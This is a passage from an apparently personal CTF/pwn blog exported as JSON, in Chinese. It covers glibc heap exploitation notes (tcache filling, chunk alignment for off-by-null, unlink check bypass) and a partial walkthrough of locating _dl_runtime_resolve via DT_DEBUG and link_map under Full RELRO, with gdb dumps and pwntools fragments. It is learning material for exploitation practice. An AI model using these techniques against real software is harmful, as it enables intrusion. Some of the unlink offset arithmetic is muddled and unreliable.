libc-dbg:i386 1）通过pwntools加载带有dbg符号的libc加载带有degub_symbols的libc，一般来说是手动添加或者加载带有调试符号的libc，glibc官方文档对此进行了说明。 后者可以从清华镜像站下载。 这里花了一些时间重新了解了一写glibc链接库的一些知识。 更改后的脚本如下 r = process([\"./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/ld-2.23.so\", \"./summer_1\"],env={\"LD_PRELOAD\":\"./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc.so.6\"}) context.log_level = 'debug' libc = ELF('./glibc/debug_symbols/lib01/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.23.so') elf = ELF('./summer_1') 执行失败。报错是 doesn't have any GOT symbols, skipping PLT 暂未找到解决方案。 2）手动查看堆内存信息根据内存分布找到堆上数据的地址，然后通过x/gx命令手动查看。 那么如何找到堆数据具体的内存地址？ 打开一个简单的堆题来参考。 可以看到heap头地址在B008，比bss_end足足高了FA5。 所以并没有找到什么联系捏。。。 3）手动编译degub版本的libc下载相应的glibc源码并编译。 编译时需要开启debug mkdir build &amp;&amp; cd biuld ../configure --prefix = /usr/local/glibc-2.29 --enable-debug = yes make -j4 &amp;&amp; sudo make install #64 bit 编译完成后可以通过链接该库直接编译程序源代码。 如果需要用该版本链接库执行已编译的程序的话可以替换二进制文件解释器路径，但是必须修改程序二进制文件的程序头，将我们需要的ld路径写入。ld路径与libc中的ld路径必须匹配，否则会出错，导致系统指令无法执行。 然后更改LD_PRELOAD环境变量 1.2-解决libc.so.6相关报错问题上述脚本执行后，python3报错，原因大致是没有libc.so.6文件。 查看对应文件夹发现情况属实。 解决方案是手动创建对应的lib.so.6文件。 1.3-附加调试后的地址随机化问题。一个很奇怪的问题，环境是ubuntu18.04，libc默认2.27. gdb直接调试程序，内存地址是固定的，但是一旦利用脚本进行附加调试就会出现地址随机化。 附加调试下的heap 直接调试下的heap 我怀疑是gdb的配置出了点什么毛病，这个ubuntu18环境是我之前随便装的，没怎么管。 解决方案： 1：暂无 2 : 无视问题，摁调。 基础知识2.1-Tcache的安全问题2.27版本下相对于2.23新增了tcache机制。 Tcache为每一个线程创建缓存，即内含一些堆块，每个线程分配64个bins，一个bins最多存7个chunk，64位下chunk的大小以16字节递增，也就是最大1032b，所以Tcache并不能存放large bin。， 释放堆块时，如果chunk大小符合要求就放入Tcache，直到Tcache被填满，这个操作是优先于fastbin或者其他操作的。 分配堆块时，如果从fastbin返回了一个合适的chunk，那么fastbin中的其他chunk都会被放入Tcache（除非被装满），smallbin同理。 以及，分配堆块时，如果Tcache中有合适的chunk，就从其中取出来，这也是优先于其他bin的。 可以看出Tcache的优先级比较高，这就导致很多有效的检测将被跳过，在提升执行效率的同时也大大提升了安全风险。 虽然但是，本题的2.27版本不涉及Tcache的安全漏洞利用。只需要将tcache填满就行。 for i in range(7) add(248,b'fill') free（i） Ps:每个size的Tcache最多有7个，也就是连续申请7个0xf8的chunk再释放就能把tcache填满。 2.2-chunk的size的内存对齐问题题目中我们申请了四个size为0xF8的chunk 申请后的heap信息如下 Allocated chunk | PREV_INUSE#截取了chunk0的信息，地址问题承接上文。 Addr: 0x1b39250 Size: 0x21 Allocated chunk | PREV_INUSE Addr: 0x1b39270 Size: 0x101 ---------------------------------------------------------------- pwndbg&gt; x/50gx 0x1b39250 0x1b39250: 0x0000000000000000 0x0000000000000021 0x1b39260: 0x0000000001b39280 0x0000000000000000 0x1b39270: 0x0000000000000000 0x0000000000000101 0x1b39280: 0x0000000a61616161 0x0000000000000000 0x1b39290: 0x0000000000000000 0x0000000000000000 可以看到没有什么太大的差错。 然而针对实际情况，我们提出两个问题。 1）为什么0xf8实际是0x101？ 0xF8 + 0x8 = 0x100（ps：101中的最低位的1是prev inuse位） 也就是实际比我们申请的多了八个字节。 那么是不是我们申请的每个堆块的实际大小都会比原来多0x8呢？ 具体来试一试。这次我们申请0xf0大小的chunk。 Allocated chunk | PREV_INUSE Addr: 0x908270 Size: 0x101#chunk的size还是0x101，相当于这次增加了0x16 注意到两个值一个16字节对齐，另一个是16的倍数再加了八字节。 事实上就是malloc的对齐机制。机制比较完善的编译器会为我们malloc的chunksize自动对进行内存对齐。比如说malloc 0x15的chunk，内存中就是0x21。0x21的来源就是malloc自动为0x15进行内存对齐。 0x12a5270: 0x0000000000000000 0x0000000000000021 0x12a5280: 0x0000000a61616161 0x0000000000000000 回到问题本身，那为什么我们要专门申请16+8的size呢？ 众所周知，ptmalloc中有一个神奇的节约内存空间的内存复用机制： 众众所周知，malloc规定，只有当本chunk的前一个chunk为free状态的时候，本chunk的prev size才是有意义的，如果本chunk的前一个chunk处于allocated状态，那么即不使用本chunk的prev size。 基于这种规定，当处于alocated状态的prev chunk越来越多，势必会造成一些浪费，所以malloc又规定，如果本chunk申请时size大小是16的倍数，那么就在它前面增加prev size位和size位，如果是16x+8的形式，那么只在chunk前增加size位，prev size位则储存在prev chunk的最后八位。也就是我们一开始碰见的情况。 因此我们要对chunk进行off by null，那么它的prev size位肯定是要可控制的，所以这里我们就需要申请16+8，将prev size分配到上一个chunk中供我们篡改。 2）chunk的size大小问题，有很多size供我们选择，为什么偏偏要是0xf8？ 解决了第一个问题，第二个问题其实很好解释。首先前文说到的，要空字节溢出，size就不能太小。其次size是16的倍数+8。满足了这两个条件只要不是大得离谱（别跑去large bin或者mmap了），随便啥size都可以，但是太大也不好掌控还浪费空间。 2.3-unlink？不管是2.23还是2.27，unlink最终目标都是通过堆叠来修改chunk指针的内容。 那为什么是unlink，而不是其他方法？ 首先来回顾一下unlink的利用过程。 在有检测的情况下，绕过检测是利用unlink的较为关键的一步。 检测使得我们不能直接修改next chunk 的fd 和bk后进行unlink。绕过的方式也有。fd和bk只要满足以下条件，则会触发target chunk的unlink。 fakeFD -&gt; bk == P` ，等价于 `*(fakeFD + 12) == P fakeBK -&gt; fd == P`` ，等价于`*(fakeBK + 8) == P 触发后，操作如下 fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD 如果*(fakeFD + 12)=*(fakeBK + 8)=*P 那么也就是 *P = P - 12 这样p的地址就向下偏移了0x12个字节。 设置*(fakeFD + 12)=*(fakeBK + 8)=*P的方法也很简单，只需要fake_fd = nextchunkptr - 0x12，fake_ bk = nextchunk -0x8就行。 虽然这样大费周章也只是让p地址下移了12，但是这0x12字节足够我们构造堆叠了。 ps：可以类比数学证明题来理解这段绕过的分析思路。从使检测成立的结果一步步逆推，这里使用的就是”根据结果推原因”，属于“分析法” 2.4-largebin其实了解large bin或者largebin attack前还需要了解unsortedbin，但是unsortedbin感觉不是重点。 稍微介绍本题中关于largebin chunk的一些比较关键的数据构。 为了加快检索速度，largebin链表增加了fd_nextsize,bk_nextsize指针，用于指向第一个与自己大小不同的chunk（所以只有当largebin中有两个大小不同的chunk时，这两个指针才会被修改)。如果 large bin 中仅有一个 chunk，那么该 chunk 的两个 nextsize 指针都会指向自己。 largebin中的chunk大致结构如下","categories":[],"tags":[{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"}]},{"title":"ret2dl_advanced","slug":"ret2dl_advanced","date":"2021-08-02T03:22:53.000Z","updated":"2021-08-02T08:11:22.155Z","comments":true,"path":"2021/08/02/ret2dl_advanced/","link":"","permalink":"https://fuurinko.github.io/2021/08/02/ret2dl_advanced/","excerpt":"","text":"ret2dl_advanced1)review当FULL RELRO保护开启时，通过 dl_run_time来获取libc基址的方式几乎无解。 但是我们仍然能够找到某种方式来getshell。 相关论文中给出一种解决方案，即通过dt_bug入口找到突破点。 (Ps:为什么找不到相关的中文文章) 2）dt_dbg？dt_dbg这个概念实际上并不新鲜，简单来说它可以被包含在libc.so文件中，比如我们指定一个特定的libc版本加载的时候，通常除了程序本体还要附加一个libc文件，有时我们的debug信息就包含在这个libc.so文件中。但是有的libc.so文件是不包含debug信息的。所以如果我们程序的libc没有dbg文件那这个方法也没用了。 dt_dubug用于指向type_r_debug这个结构体。这个结构体用来保存调试器需要的信息来确认动态装载器的基址和拦截一些特定的与动态装载相关的事件。 此外，这个结构体的r_map域保存了指向link_map的链接表表头的指针。 也就是dt_dbg指向type_r_debug，且type_r_debug维护了指向link_map的指针。 r_debug具体代码如下: /* Rendezvous structure used by the run-time dynamic linker to communicate details of shared object loading to the debugger. If the executable's dynamic section has a DT_DEBUG element, the run-time linker sets that element's value to the address where this structure can be found. */ struct r_debug { int r_version; /* Version number for this protocol. */ struct link_map *r_map; /* Head of the chain of loaded objects. */ /* This is the address of a function internal to the run-time linker, that will always be called when the linker begins to map in a library or unmap it, and again when the mapping change is complete. The debugger can set a breakpoint at this address if it wants to notice shared object mapping changes. */ ElfW(Addr) r_brk; enum { /* This state value describes the mapping change taking place when the `r_brk' address is called. */ RT_CONSISTENT, /* Mapping change is complete. */ RT_ADD, /* Beginning to add a new object. */ RT_DELETE /* Beginning to remove an object mapping. */ } r_state; ElfW(Addr) r_ldbase; /* Base address the linker is loaded at. */ }; 实操一遍 随便写一个无output的栈溢出。 fur1n@ubuntu:~/pwn$ readelf -d ret2dl Dynamic section at offset 0xdb8 contains 27 entries: Tag Type Name/Value ... 0x0000000000000015 (DEBUG) 0x0 在没有运行的时候dt_dbg为空。 在关闭aslr的情况下找到dt_debug并不困难。 gdb使用elfheader命令查看相关elfheader的地址，可以找到.dynamic 段的地址。 pwndbg&gt; x/50gx 0x600e20 ... 0x600ee0: 0x0000000000000015 0x00007ffff7ffe140 0x00007ffff7ffe140也就是dt_debug指向的r_debug的地址。 pwndbg&gt; x/20gx 0x00007ffff7ffe140 0x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 0x7ffff7ffe150 &lt;_r_debug+16&gt;: 0x00007ffff7de3f40 0x0000000000000000 0x7ffff7ffe160 &lt;_r_debug+32&gt;: 0x00007ffff7dd3000 0x0000000000000000 0x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe700 0x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710 0x7ffff7ffe190: 0x0000000000000000 0x00007ffff7ffe170 0x7ffff7ffe1a0: 0x0000000000000000 0x00007ffff7ffe6e8 0x7ffff7ffe1b0: 0x0000000000000000 0x0000000000600e20 0x7ffff7ffe1c0: 0x0000000000600f00 0x0000000000600ef0 0x7ffff7ffe1d0: 0x0000000000000000 0x0000000000600ea0 r_debug维护的第一个结构体，也就是link_map地址，即0x00007ffff7ffe170 0x7ffff7ffe140 &lt;_r_debug&gt;: 0x0000000000000001 0x00007ffff7ffe170 这样我们就从dt_debug找到了link_map的地址。 虽然但是。 只是找到link_map没啥用。 我们的最终目的还是寻找到dl_runtime_resolve函数的地址，当地址被找到那么之后的操作就是常规的ret2dl了。 能从动态链接库中找到dl_runtime_resolve函数地址的原理大致是Full RELRO保护只对main excutable生效，而动态链接库并不受它保护。这就意味着我们如果能够通过动态链接库来找到dl_runtime_resolve函数地址，那么问题就迎刃而解了。 那么如何寻找呢？ 实际比较简单（无aslr的情况），只要根据link_map的结构依次顺下来就好了。 上一个section我们找到了link_map的地址，接下来我们通过link_map逐步找到 dl_runtime_resolve。 首先我们找到libc.so.6文件。 pwndbg&gt; x/20gx 0x00007ffff7ffe170 0x7ffff7ffe170: 0x0000000000000000 0x00007ffff7ffe700 0x7ffff7ffe180: 0x0000000000600e20 0x00007ffff7ffe710 --- pwndbg&gt; x/20gx 0x00007ffff7ffe700 0x7ffff7ffe700: 0x0000000000000000 0x0000000000000000 0x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0 --- pwndbg&gt; x/s 0x00007ffff7ffebb0 0x7ffff7ffebb0: \"linux-vdso.so.1\" --- pwndbg&gt; x/10gx 0x00007ffff7ffe710 0x7ffff7ffe710: 0x00007ffff7ffb000 0x00007ffff7ffebb0 0x7ffff7ffe720: 0x00007ffff7ffb3a0 0x00007ffff7fe2000 --- pwndbg&gt; x/10gx 0x00007ffff7fe2000 0x7ffff7fe2000: 0x00007ffff79e2000 0x00007ffff7ffedd0 --- pwndbg&gt; x/s 0x00007ffff7ffedd0 0x7ffff7ffedd0: \"/lib/x86_64-linux-gnu/libc.so.6\" 即0x00007ffff7ffedd0。 0x3即GOT[]入口 pwndbg&gt; x/30gx 0x00007ffff7dccb80 ... 0x7ffff7dccc30: 0x0000000000000003 0x00007ffff7dcd000 找到GOT[3] pwndbg&gt; x/5gx 0x00007ffff7dcd000 0x7ffff7dcd000: 0x00000000003eab80 0x00007ffff7fe2000 0x7ffff7dcd010: 0x00007ffff7dea8f0 0x00007ffff7b70a10 pwndbg&gt; xinfo 0x00007ffff7dea8f0 Extended information for virtual address 0x7ffff7dea8f0: Containing mapping: 0x7ffff7dd3000 0x7ffff7dfc000 r-xp 29000 0 /lib/x86_64-linux-gnu/ld-2.27.so Offset information: Mapped Area 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Base) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Segment) 0x7ffff7dea8f0 = 0x7ffff7dd3000 + 0x178f0 File (Disk) 0x7ffff7dea8f0 = /lib/x86_64-linux-gnu/ld-2.27.so + 0x178f0 Containing ELF sections: .text 0x7ffff7dea8f0 = 0x7ffff7dd3f10 + 0x169e0 3）exploitation在无aslr并已经获取到dl_runtime_resolve的情况下的利用和patial relro相似。 有aslr的情况。。 我也不会。 4)refrence通过DT_DEBUG来获得各个库的基址 How the ELF Ruined Christmas Finding link_map and _dl_runtime_resolve() under full RELRO ————————————————tbc——————————————————-","categories":[],"tags":[{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"}]}],"categories":[],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"},{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"},{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"},{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"},{"name":"format","slug":"format","permalink":"https://fuurinko.github.io/tags/format/"},{"name":"pwntools","slug":"pwntools","permalink":"https://fuurinko.github.io/tags/pwntools/"},{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"},{"name":"asm Primary","slug":"asm-Primary","permalink":"https://fuurinko.github.io/tags/asm-Primary/"},{"name":"Heap","slug":"Heap","permalink":"https://fuurinko.github.io/tags/Heap/"},{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"}]}